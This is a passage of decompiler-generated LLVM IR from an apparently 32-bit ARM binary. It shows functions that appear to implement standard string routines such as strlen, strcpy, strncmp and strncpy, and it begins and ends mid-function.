dec_label_pc_f024:                                ; preds = %bb3, %.dec_label_pc_f024_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_f024_crit_edge ], [ %v3_f010, %bb3 ]
  %v2_f024.pre-phi = sub nsw i32 %.pn, %v3_f014
  ret i32 %v2_f024.pre-phi

; uselistorder directives
  uselistorder i8 %v2_f010, { 0, 2, 1 }
  uselistorder i32 %v0_f010, { 1, 0 }
  uselistorder i32 %v0_f014, { 1, 0 }
  uselistorder label %dec_label_pc_f024, { 1, 0 }
}

define i32 @function_f030() local_unnamed_addr {
dec_label_pc_f030:
  %v0_f030 = load i32, i32* @r0, align 4
  %v1_f030 = and i32 %v0_f030, -4
  %v1_f034 = inttoptr i32 %v1_f030 to i32*
  %v2_f034 = load i32, i32* %v1_f034, align 4
  %v1_f038 = urem i32 %v0_f030, 4
  %v2_f038 = icmp eq i32 %v1_f038, 0
  %v1_f03c = sub nsw i32 0, %v1_f038
  br i1 %v2_f038, label %.preheader.preheader, label %dec_label_pc_f044

dec_label_pc_f044:                                ; preds = %dec_label_pc_f030
  %v1_f044 = or i32 %v2_f034, 255
  %v7_f048 = icmp eq i32 %v1_f038, 1
  br i1 %v7_f048, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_f044
  %v9_f04c = or i32 %v2_f034, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_f044, %bb
  %v8_f054 = phi i32 [ %v1_f044, %dec_label_pc_f044 ], [ %v9_f04c, %bb ]
  %v7_f054 = icmp eq i32 %v1_f038, 3
  br i1 %v7_f054, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_f054 = or i32 %v8_f054, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_f030
  %v1_f064.ph = phi i32 [ %v2_f034, %dec_label_pc_f030 ], [ %v9_f054, %bb34 ], [ %v8_f054, %bb33 ]
  %v1_f05838 = urem i32 %v1_f064.ph, 256
  %v2_f05839 = icmp eq i32 %v1_f05838, 0
  %v2_f05c40 = and i32 %v1_f064.ph, 65280
  %v3_f05c41 = icmp eq i32 %v2_f05c40, 0
  %or.cond42 = or i1 %v2_f05839, %v3_f05c41
  %v2_f06043 = and i32 %v1_f064.ph, 16711680
  %v3_f06044 = icmp eq i32 %v2_f06043, 0
  %or.cond3145 = or i1 %v3_f06044, %or.cond42
  %v4_f06446 = icmp ult i32 %v1_f064.ph, 16777216
  %or.cond3247 = or i1 %v4_f06446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_f074, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_f0681349 = phi i32 [ %v2_f06814, %.thread4 ], [ %v1_f03c, %.preheader.preheader ]
  %v1_f06c48.in = phi i32 [ %v1_f06c48, %.thread4 ], [ %v1_f030, %.preheader.preheader ]
  %v1_f06c48 = add i32 %v1_f06c48.in, 4
  %v2_f06814 = add i32 %v1_f0681349, 4
  %v2_f06c = inttoptr i32 %v1_f06c48 to i32*
  %v3_f06c = load i32, i32* %v2_f06c, align 4
  %v1_f058 = urem i32 %v3_f06c, 256
  %v2_f058 = icmp eq i32 %v1_f058, 0
  %v2_f05c = and i32 %v3_f06c, 65280
  %v3_f05c = icmp eq i32 %v2_f05c, 0
  %or.cond = or i1 %v2_f058, %v3_f05c
  %v2_f060 = and i32 %v3_f06c, 16711680
  %v3_f060 = icmp eq i32 %v2_f060, 0
  %or.cond31 = or i1 %v3_f060, %or.cond
  %v4_f064 = icmp ult i32 %v3_f06c, 16777216
  %or.cond32 = or i1 %v4_f064, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_f074, label %.thread4

dec_label_pc_f074:                                ; preds = %.thread4, %.preheader.preheader
  %v1_f06813.lcssa = phi i32 [ %v1_f03c, %.preheader.preheader ], [ %v2_f06814, %.thread4 ]
  %v2_f058.lcssa = phi i1 [ %v2_f05839, %.preheader.preheader ], [ %v2_f058, %.thread4 ]
  %v3_f05c.lcssa = phi i1 [ %v3_f05c41, %.preheader.preheader ], [ %v3_f05c, %.thread4 ]
  %v3_f060.lcssa = phi i1 [ %v3_f06044, %.preheader.preheader ], [ %v3_f060, %.thread4 ]
  br i1 %v2_f058.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_f074
  %v2_f078 = add i32 %v1_f06813.lcssa, 1
  br i1 %v3_f05c.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_f08017 = add i32 %v1_f06813.lcssa, 2
  br i1 %v3_f060.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_f088 = add i32 %v1_f06813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_f074, %bb35, %bb36, %bb37
  %v1_f08c = phi i32 [ %v2_f078, %bb35 ], [ %v2_f08017, %bb36 ], [ %v2_f088, %bb37 ], [ %v1_f06813.lcssa, %dec_label_pc_f074 ]
  ret i32 %v1_f08c

; uselistorder directives
  uselistorder i32 %v1_f06813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_f06c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_f064.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f038, { 3, 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0, 2 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_f090(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_f090:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_f090 = sub i32 %arg1, %tmp
  %v1_f094 = add i32 %v2_f090, -1
  store i32 %v1_f094, i32* @r2, align 4
  %v2_f0984 = load i8, i8* %arg2, align 1
  %v5_f0986 = add i32 %tmp, 1
  store i32 %v5_f0986, i32* %r1.global-to-local, align 4
  %v2_f09c7 = icmp eq i8 %v2_f0984, 0
  store i1 %v2_f09c7, i1* %cpsr_z.global-to-local, align 1
  %v5_f0a08 = inttoptr i32 %arg1 to i8*
  store i8 %v2_f0984, i8* %v5_f0a08, align 1
  %v0_f0a49 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0a49, label %dec_label_pc_f0a8, label %dec_label_pc_f098.dec_label_pc_f098_crit_edge

dec_label_pc_f098.dec_label_pc_f098_crit_edge:    ; preds = %dec_label_pc_f090, %dec_label_pc_f098.dec_label_pc_f098_crit_edge
  %v0_f098.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_f0a0.pre = load i32, i32* @r2, align 4
  %v1_f098 = inttoptr i32 %v0_f098.pre to i8*
  %v2_f098 = load i8, i8* %v1_f098, align 1
  %v5_f098 = add i32 %v0_f098.pre, 1
  store i32 %v5_f098, i32* %r1.global-to-local, align 4
  %v2_f09c = icmp eq i8 %v2_f098, 0
  store i1 %v2_f09c, i1* %cpsr_z.global-to-local, align 1
  %v4_f0a0 = add i32 %v5_f098, %v3_f0a0.pre
  %v5_f0a0 = inttoptr i32 %v4_f0a0 to i8*
  store i8 %v2_f098, i8* %v5_f0a0, align 1
  %v0_f0a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0a4, label %dec_label_pc_f0a8, label %dec_label_pc_f098.dec_label_pc_f098_crit_edge

dec_label_pc_f0a8:                                ; preds = %dec_label_pc_f098.dec_label_pc_f098_crit_edge, %dec_label_pc_f090
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f098.dec_label_pc_f098_crit_edge, { 1, 0 }
}

define i32 @function_f0ac(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f0ac:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_f0ac = load i32, i32* %r2.global-to-local, align 4
  %v0_f0b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f0b4, i32* @lr, align 4
  %tmp143 = icmp ult i32 %v0_f0ac, 4
  br i1 %tmp143, label %.thread59, label %dec_label_pc_f0e0

.thread59:                                        ; preds = %dec_label_pc_f0ac
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f1bcthread-pre-split

dec_label_pc_f0c8:                                ; preds = %thread-pre-split
  store i32 %v2_f11c, i32* %r0.global-to-local, align 4
  ret i32 %v2_f11c

dec_label_pc_f0d0:                                ; preds = %bb74, %.thread6
  store i32 %v2_f144, i32* %r0.global-to-local, align 4
  ret i32 %v2_f144

dec_label_pc_f0d8:                                ; preds = %bb77, %bb68, %.thread14, %.thread10, %.thread, %bb80
  %v1_f0d8 = phi i32 [ 0, %.thread14 ], [ 0, %.thread10 ], [ 0, %.thread ], [ %v3_f194, %bb80 ], [ %v4_f15c, %bb77 ], [ %v3_f0e4, %bb68 ]
  %v0_f0d8 = phi i32 [ %v3_f198, %.thread14 ], [ %v4_f160, %.thread10 ], [ %v3_f0e8, %.thread ], [ %v3_f198, %bb80 ], [ %v4_f160, %bb77 ], [ %v3_f0e8, %bb68 ]
  %v2_f0d8 = sub nsw i32 %v1_f0d8, %v0_f0d8
  store i32 %v2_f0d8, i32* %r0.global-to-local, align 4
  ret i32 %v2_f0d8

dec_label_pc_f0e0:                                ; preds = %dec_label_pc_f0ac
  %v3_f0e0 = udiv i32 %v0_f0ac, 4
  %v0_f0e8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f0e4

dec_label_pc_f0e4:                                ; preds = %dec_label_pc_f184, %dec_label_pc_f0e0
  %v0_f184 = phi i32 [ %v1_f184, %dec_label_pc_f184 ], [ %v3_f0e0, %dec_label_pc_f0e0 ]
  %v0_f12c = phi i32 [ %v1_f168, %dec_label_pc_f184 ], [ %v0_f0e8.pre, %dec_label_pc_f0e0 ]
  %v0_f104 = phi i32 [ %v1_f118, %dec_label_pc_f184 ], [ %v0_f0b4, %dec_label_pc_f0e0 ]
  %v1_f0e4 = inttoptr i32 %v0_f104 to i8*
  %v2_f0e4 = load i8, i8* %v1_f0e4, align 1
  %v3_f0e4 = zext i8 %v2_f0e4 to i32
  store i32 %v3_f0e4, i32* %r0.global-to-local, align 4
  %v1_f0e8 = inttoptr i32 %v0_f12c to i8*
  %v2_f0e8 = load i8, i8* %v1_f0e8, align 1
  %v3_f0e8 = zext i8 %v2_f0e8 to i32
  %v2_f0ec = sub nsw i32 %v3_f0e4, %v3_f0e8
  %v9_f0ec = icmp eq i8 %v2_f0e4, %v2_f0e8
  br i1 %v9_f0ec, label %bb67, label %bb

bb:                                               ; preds = %dec_label_pc_f0e4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_f0e4, %bb
  %v1_f0f8 = phi i32 [ %v2_f0ec, %dec_label_pc_f0e4 ], [ 1, %bb ]
  %v2_f0f4 = icmp eq i8 %v2_f0e4, 0
  br i1 %v2_f0f4, label %.thread, label %bb68

.thread:                                          ; preds = %bb67
  br label %dec_label_pc_f0d8

bb68:                                             ; preds = %bb67
  %v2_f0fc = icmp eq i32 %v1_f0f8, 0
  br i1 %v2_f0fc, label %dec_label_pc_f104, label %dec_label_pc_f0d8

dec_label_pc_f104:                                ; preds = %bb68
  %v1_f104 = add i32 %v0_f104, 1
  %v2_f108 = inttoptr i32 %v1_f104 to i8*
  %v3_f108 = load i8, i8* %v2_f108, align 1
  %v4_f108 = zext i8 %v3_f108 to i32
  store i32 %v4_f108, i32* %r0.global-to-local, align 4
  %v1_f10c = add i32 %v0_f12c, 1
  %v2_f10c = inttoptr i32 %v1_f10c to i8*
  %v3_f10c = load i8, i8* %v2_f10c, align 1
  %v4_f10c = zext i8 %v3_f10c to i32
  %v1_f110 = add i32 %v0_f104, 2
  %v1_f118 = add i32 %v0_f104, 4
  store i32 %v1_f118, i32* @lr, align 4
  %v2_f11c = sub nsw i32 %v4_f108, %v4_f10c
  %v9_f11c = icmp eq i8 %v3_f108, %v3_f10c
  br i1 %v9_f11c, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_f104
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_f104, %bb69
  %v1_f128 = phi i32 [ %v2_f11c, %dec_label_pc_f104 ], [ 1, %bb69 ]
  %v2_f124 = icmp eq i8 %v3_f108, 0
  br i1 %v2_f124, label %bb71, label %thread-pre-split

bb71:                                             ; preds = %bb70
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb70, %bb71
  %v0_f130 = phi i32 [ 1, %bb71 ], [ %v1_f128, %bb70 ]
  %v2_f130 = icmp eq i32 %v0_f130, 0
  br i1 %v2_f130, label %dec_label_pc_f13c, label %dec_label_pc_f0c8

dec_label_pc_f13c:                                ; preds = %thread-pre-split
  %v1_f134 = add i32 %v0_f12c, 2
  %v2_f13c = inttoptr i32 %v1_f110 to i8*
  %v3_f13c = load i8, i8* %v2_f13c, align 1
  %v4_f13c = zext i8 %v3_f13c to i32
  store i32 %v4_f13c, i32* %r0.global-to-local, align 4
  %v2_f140 = inttoptr i32 %v1_f134 to i8*
  %v3_f140 = load i8, i8* %v2_f140, align 1
  %v4_f140 = zext i8 %v3_f140 to i32
  %v2_f144 = sub nsw i32 %v4_f13c, %v4_f140
  %v9_f144 = icmp eq i8 %v3_f13c, %v3_f140
  br i1 %v9_f144, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_f13c
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_f13c, %bb72
  %v1_f150 = phi i32 [ %v2_f144, %dec_label_pc_f13c ], [ 1, %bb72 ]
  %v2_f14c = icmp eq i8 %v3_f13c, 0
  br i1 %v2_f14c, label %.thread6, label %bb74

.thread6:                                         ; preds = %bb73
  br label %dec_label_pc_f0d0

bb74:                                             ; preds = %bb73
  %v2_f154 = icmp eq i32 %v1_f150, 0
  br i1 %v2_f154, label %dec_label_pc_f15c, label %dec_label_pc_f0d0

dec_label_pc_f15c:                                ; preds = %bb74
  %v1_f15c = add i32 %v0_f104, 3
  %v2_f15c = inttoptr i32 %v1_f15c to i8*
  %v3_f15c = load i8, i8* %v2_f15c, align 1
  %v4_f15c = zext i8 %v3_f15c to i32
  store i32 %v4_f15c, i32* %r0.global-to-local, align 4
  %v1_f160 = add i32 %v0_f12c, 3
  %v2_f160 = inttoptr i32 %v1_f160 to i8*
  %v3_f160 = load i8, i8* %v2_f160, align 1
  %v4_f160 = zext i8 %v3_f160 to i32
  %v1_f168 = add i32 %v0_f12c, 4
  store i32 %v1_f168, i32* @r1, align 4
  %v2_f16c = sub nsw i32 %v4_f15c, %v4_f160
  %v9_f16c = icmp eq i8 %v3_f15c, %v3_f160
  br i1 %v9_f16c, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_f15c
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_f15c, %bb75
  %v1_f178 = phi i32 [ %v2_f16c, %dec_label_pc_f15c ], [ 1, %bb75 ]
  %v2_f174 = icmp eq i8 %v3_f15c, 0
  br i1 %v2_f174, label %.thread10, label %bb77

.thread10:                                        ; preds = %bb76
  br label %dec_label_pc_f0d8

bb77:                                             ; preds = %bb76
  %v2_f17c = icmp eq i32 %v1_f178, 0
  br i1 %v2_f17c, label %dec_label_pc_f184, label %dec_label_pc_f0d8

dec_label_pc_f184:                                ; preds = %bb77
  %v1_f184 = add i32 %v0_f184, -1
  %v7_f184 = icmp eq i32 %v0_f184, 1
  br i1 %v7_f184, label %dec_label_pc_f18c, label %dec_label_pc_f0e4

dec_label_pc_f18c:                                ; preds = %dec_label_pc_f184
  %v1_f18c = urem i32 %v0_f0ac, 4
  store i32 %v1_f18c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f1bc

dec_label_pc_f194:                                ; preds = %dec_label_pc_f1bc
  %v1_f194 = inttoptr i32 %v0_f1b4 to i8*
  %v2_f194 = load i8, i8* %v1_f194, align 1
  %v3_f194 = zext i8 %v2_f194 to i32
  store i32 %v3_f194, i32* %r0.global-to-local, align 4
  %v0_f198 = load i32, i32* @r1, align 4
  %v1_f198 = inttoptr i32 %v0_f198 to i8*
  %v2_f198 = load i8, i8* %v1_f198, align 1
  %v3_f198 = zext i8 %v2_f198 to i32
  %v2_f19c = sub nsw i32 %v3_f194, %v3_f198
  %v9_f19c = icmp eq i8 %v2_f194, %v2_f198
  br i1 %v9_f19c, label %bb79, label %bb78

bb78:                                             ; preds = %dec_label_pc_f194
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_f194, %bb78
  %v1_f1a8 = phi i32 [ %v2_f19c, %dec_label_pc_f194 ], [ 1, %bb78 ]
  %v2_f1a4 = icmp eq i8 %v2_f194, 0
  br i1 %v2_f1a4, label %.thread14, label %bb80

.thread14:                                        ; preds = %bb79
  br label %dec_label_pc_f0d8

bb80:                                             ; preds = %bb79
  %v2_f1ac = icmp eq i32 %v1_f1a8, 0
  br i1 %v2_f1ac, label %dec_label_pc_f1b4, label %dec_label_pc_f0d8

dec_label_pc_f1b4:                                ; preds = %bb80
  %v1_f1b4 = add i32 %v0_f1b4, 1
  store i32 %v1_f1b4, i32* @lr, align 4
  %v1_f1b8 = add i32 %v0_f198, 1
  store i32 %v1_f1b8, i32* @r1, align 4
  br label %dec_label_pc_f1bcthread-pre-split

dec_label_pc_f1bcthread-pre-split:                ; preds = %.thread59, %dec_label_pc_f1b4
  %v0_f1c8142 = phi i32 [ %v3_f198, %dec_label_pc_f1b4 ], [ 0, %.thread59 ]
  %v1_f1c854 = phi i32 [ %v3_f194, %dec_label_pc_f1b4 ], [ 0, %.thread59 ]
  %v0_f19447 = phi i32 [ %v1_f1b4, %dec_label_pc_f1b4 ], [ %v0_f0b4, %.thread59 ]
  %v0_f1bc.pr = phi i32 [ %v1_f1c0, %dec_label_pc_f1b4 ], [ %v0_f0ac, %.thread59 ]
  br label %dec_label_pc_f1bc

dec_label_pc_f1bc:                                ; preds = %dec_label_pc_f1bcthread-pre-split, %dec_label_pc_f18c
  %v0_f1c8 = phi i32 [ %v0_f1c8142, %dec_label_pc_f1bcthread-pre-split ], [ %v4_f160, %dec_label_pc_f18c ]
  %v1_f1c8 = phi i32 [ %v1_f1c854, %dec_label_pc_f1bcthread-pre-split ], [ %v4_f15c, %dec_label_pc_f18c ]
  %v0_f1b4 = phi i32 [ %v0_f19447, %dec_label_pc_f1bcthread-pre-split ], [ %v1_f118, %dec_label_pc_f18c ]
  %v0_f1c0 = phi i32 [ %v0_f1bc.pr, %dec_label_pc_f1bcthread-pre-split ], [ %v1_f18c, %dec_label_pc_f18c ]
  %v2_f1bc = icmp eq i32 %v0_f1c0, 0
  %v1_f1c0 = add i32 %v0_f1c0, -1
  store i32 %v1_f1c0, i32* %r2.global-to-local, align 4
  br i1 %v2_f1bc, label %dec_label_pc_f1c8, label %dec_label_pc_f194

dec_label_pc_f1c8:                                ; preds = %dec_label_pc_f1bc
  %v2_f1c8 = sub nsw i32 %v1_f1c8, %v0_f1c8
  store i32 %v2_f1c8, i32* %r0.global-to-local, align 4
  ret i32 %v2_f1c8

; uselistorder directives
  uselistorder i32 %v1_f1c0, { 1, 0 }
  uselistorder i32 %v0_f1b4, { 1, 0 }
  uselistorder i32 %v3_f198, { 0, 3, 2, 1 }
  uselistorder i32 %v3_f194, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f18c, { 1, 0 }
  uselistorder i32 %v1_f168, { 1, 0 }
  uselistorder i32 %v4_f160, { 1, 3, 2, 0 }
  uselistorder i32 %v4_f15c, { 1, 2, 3, 0 }
  uselistorder i32 %v2_f144, { 2, 0, 1 }
  uselistorder i32 %v2_f11c, { 2, 0, 1 }
  uselistorder i32 %v1_f118, { 0, 2, 1 }
  uselistorder i32 %v3_f0e8, { 2, 1, 0 }
  uselistorder i32 %v3_f0e4, { 1, 2, 0 }
  uselistorder i32 %v0_f0ac, { 3, 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 6, 8, 10, 9, 5, 7, 11, 0, 1 }
  uselistorder label %dec_label_pc_f1bcthread-pre-split, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_f0d8, { 5, 2, 0, 3, 1, 4 }
}

define i32 @function_f1d0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f1d0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_f1d0 = icmp eq i32 %arg2, 3
  store i1 %v7_f1d0, i1* %cpsr_z.global-to-local, align 1
  %v1_f1d8 = add i32 %arg1, -1
  store i32 %v1_f1d8, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_f254, label %dec_label_pc_f1e0

dec_label_pc_f1e0:                                ; preds = %dec_label_pc_f1d0
  %v3_f1e0 = udiv i32 %arg2, 4
  store i32 %v3_f1e0, i32* @lr, align 4
  %v0_f1e4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f1e4

dec_label_pc_f1e4:                                ; preds = %dec_label_pc_f230, %dec_label_pc_f1e0
  %v2_f1ec = phi i32 [ %v6_f224, %dec_label_pc_f230 ], [ %v1_f1d8, %dec_label_pc_f1e0 ]
  %v0_f1e4 = phi i32 [ %v1_f234, %dec_label_pc_f230 ], [ %v0_f1e4.pre, %dec_label_pc_f1e0 ]
  %v1_f1e4 = inttoptr i32 %v0_f1e4 to i8*
  %v2_f1e4 = load i8, i8* %v1_f1e4, align 1
  %v3_f1e4 = zext i8 %v2_f1e4 to i32
  store i32 %v3_f1e4, i32* %r3.global-to-local, align 4
  %v2_f1e8 = icmp eq i8 %v2_f1e4, 0
  store i1 %v2_f1e8, i1* %cpsr_z.global-to-local, align 1
  %v3_f1ec = add i32 %v2_f1ec, 1
  %v4_f1ec = inttoptr i32 %v3_f1ec to i8*
  store i8 %v2_f1e4, i8* %v4_f1ec, align 1
  %v5_f1ec = load i32, i32* %ip.global-to-local, align 4
  %v6_f1ec = add i32 %v5_f1ec, 1
  store i32 %v6_f1ec, i32* %ip.global-to-local, align 4
  %v0_f1f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f1f0, label %dec_label_pc_f240, label %dec_label_pc_f1f4

dec_label_pc_f1f4:                                ; preds = %dec_label_pc_f1e4
  %v0_f1f4 = load i32, i32* @r1, align 4
  %v1_f1f4 = add i32 %v0_f1f4, 1
  %v2_f1f4 = inttoptr i32 %v1_f1f4 to i8*
  %v3_f1f4 = load i8, i8* %v2_f1f4, align 1
  %v4_f1f4 = zext i8 %v3_f1f4 to i32
  store i32 %v4_f1f4, i32* %r3.global-to-local, align 4
  %v2_f1f8 = icmp eq i8 %v3_f1f4, 0
  store i1 %v2_f1f8, i1* %cpsr_z.global-to-local, align 1
  %v3_f1fc = add i32 %v5_f1ec, 2
  %v4_f1fc = inttoptr i32 %v3_f1fc to i8*
  store i8 %v3_f1f4, i8* %v4_f1fc, align 1
  %v5_f1fc = load i32, i32* %ip.global-to-local, align 4
  %v6_f1fc = add i32 %v5_f1fc, 1
  store i32 %v6_f1fc, i32* %ip.global-to-local, align 4
  %v0_f200 = load i32, i32* @r1, align 4
  %v1_f200 = add i32 %v0_f200, 1
  store i32 %v1_f200, i32* %r1.global-to-local, align 4
  %v0_f204 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f204, label %dec_label_pc_f240, label %dec_label_pc_f208

dec_label_pc_f208:                                ; preds = %dec_label_pc_f1f4
  %v1_f208 = add i32 %v0_f200, 2
  %v2_f208 = inttoptr i32 %v1_f208 to i8*
  %v3_f208 = load i8, i8* %v2_f208, align 1
  %v4_f208 = zext i8 %v3_f208 to i32
  store i32 %v4_f208, i32* %r3.global-to-local, align 4
  %v2_f20c = icmp eq i8 %v3_f208, 0
  store i1 %v2_f20c, i1* %cpsr_z.global-to-local, align 1
  %v3_f210 = add i32 %v5_f1fc, 2
  %v4_f210 = inttoptr i32 %v3_f210 to i8*
  store i8 %v3_f208, i8* %v4_f210, align 1
  %v5_f210 = load i32, i32* %ip.global-to-local, align 4
  %v6_f210 = add i32 %v5_f210, 1
  store i32 %v6_f210, i32* %ip.global-to-local, align 4
  %v0_f214 = load i32, i32* %r1.global-to-local, align 4
  %v1_f214 = add i32 %v0_f214, 1
  store i32 %v1_f214, i32* %r1.global-to-local, align 4
  %v0_f218 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f218, label %dec_label_pc_f240, label %dec_label_pc_f21c

dec_label_pc_f21c:                                ; preds = %dec_label_pc_f208
  %v1_f21c = add i32 %v0_f214, 2
  %v2_f21c = inttoptr i32 %v1_f21c to i8*
  %v3_f21c = load i8, i8* %v2_f21c, align 1
  %v4_f21c = zext i8 %v3_f21c to i32
  store i32 %v4_f21c, i32* %r3.global-to-local, align 4
  %v2_f220 = icmp eq i8 %v3_f21c, 0
  store i1 %v2_f220, i1* %cpsr_z.global-to-local, align 1
  %v3_f224 = add i32 %v5_f210, 2
  %v4_f224 = inttoptr i32 %v3_f224 to i8*
  store i8 %v3_f21c, i8* %v4_f224, align 1
  %v5_f224 = load i32, i32* %ip.global-to-local, align 4
  %v6_f224 = add i32 %v5_f224, 1
  store i32 %v6_f224, i32* %ip.global-to-local, align 4
  %v0_f228 = load i32, i32* %r1.global-to-local, align 4
  %v1_f228 = add i32 %v0_f228, 1
  store i32 %v1_f228, i32* %r1.global-to-local, align 4
  %v0_f22c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f22c, label %dec_label_pc_f240, label %dec_label_pc_f230

dec_label_pc_f230:                                ; preds = %dec_label_pc_f21c
  %v0_f230 = load i32, i32* @lr, align 4
  %v1_f230 = add i32 %v0_f230, -1
  store i32 %v1_f230, i32* @lr, align 4
  %v7_f230 = icmp eq i32 %v0_f230, 1
  store i1 %v7_f230, i1* %cpsr_z.global-to-local, align 1
  %v1_f234 = add i32 %v0_f228, 2
  store i32 %v1_f234, i32* @r1, align 4
  br i1 %v7_f230, label %dec_label_pc_f254, label %dec_label_pc_f1e4

dec_label_pc_f240:                                ; preds = %dec_label_pc_f21c, %dec_label_pc_f208, %dec_label_pc_f1f4, %dec_label_pc_f1e4
  %v1_f240 = phi i32 [ %v6_f224, %dec_label_pc_f21c ], [ %v6_f210, %dec_label_pc_f208 ], [ %v6_f1fc, %dec_label_pc_f1f4 ], [ %v6_f1ec, %dec_label_pc_f1e4 ]
  %v2_f2401 = sub i32 %arg1, %v1_f240
  %v2_f244 = add i32 %v2_f2401, %arg2
  store i32 %v2_f244, i32* %r3.global-to-local, align 4
  %v1_f248 = add i32 %v2_f244, -1
  store i32 %v1_f248, i32* %r2.global-to-local, align 4
  %v7_f248 = icmp eq i32 %v2_f244, 1
  store i1 %v7_f248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f248, label %bb, label %dec_label_pc_f274

bb:                                               ; preds = %dec_label_pc_f240
  ret i32 %arg1

dec_label_pc_f254:                                ; preds = %dec_label_pc_f230, %dec_label_pc_f1d0
  %v2_f2646 = phi i32 [ %v1_f1d8, %dec_label_pc_f1d0 ], [ %v6_f224, %dec_label_pc_f230 ]
  %v1_f254 = urem i32 %arg2, 4
  store i32 %v1_f254, i32* %r2.global-to-local, align 4
  %v2_f254 = icmp eq i32 %v1_f254, 0
  store i1 %v2_f254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f254, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_f254
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_f254, %._crit_edge
  %v2_f264 = phi i32 [ %v6_f264, %._crit_edge ], [ %v2_f2646, %dec_label_pc_f254 ]
  %v0_f260 = phi i32 [ %v0_f260.pre, %._crit_edge ], [ %v1_f254, %dec_label_pc_f254 ]
  %v0_f25c = load i32, i32* @r1, align 4
  %v1_f25c = inttoptr i32 %v0_f25c to i8*
  %v2_f25c = load i8, i8* %v1_f25c, align 1
  %v3_f25c = zext i8 %v2_f25c to i32
  store i32 %v3_f25c, i32* %r3.global-to-local, align 4
  %v5_f25c = add i32 %v0_f25c, 1
  store i32 %v5_f25c, i32* @r1, align 4
  %v1_f260 = add i32 %v0_f260, -1
  store i32 %v1_f260, i32* %r2.global-to-local, align 4
  %v7_f260 = icmp eq i32 %v0_f260, 1
  store i1 %v7_f260, i1* %cpsr_z.global-to-local, align 1
  %v3_f264 = add i32 %v2_f264, 1
  %v4_f264 = inttoptr i32 %v3_f264 to i8*
  store i8 %v2_f25c, i8* %v4_f264, align 1
  %v5_f264 = load i32, i32* %ip.global-to-local, align 4
  %v6_f264 = add i32 %v5_f264, 1
  store i32 %v6_f264, i32* %ip.global-to-local, align 4
  %v0_f268 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f268, label %bb12, label %bb13

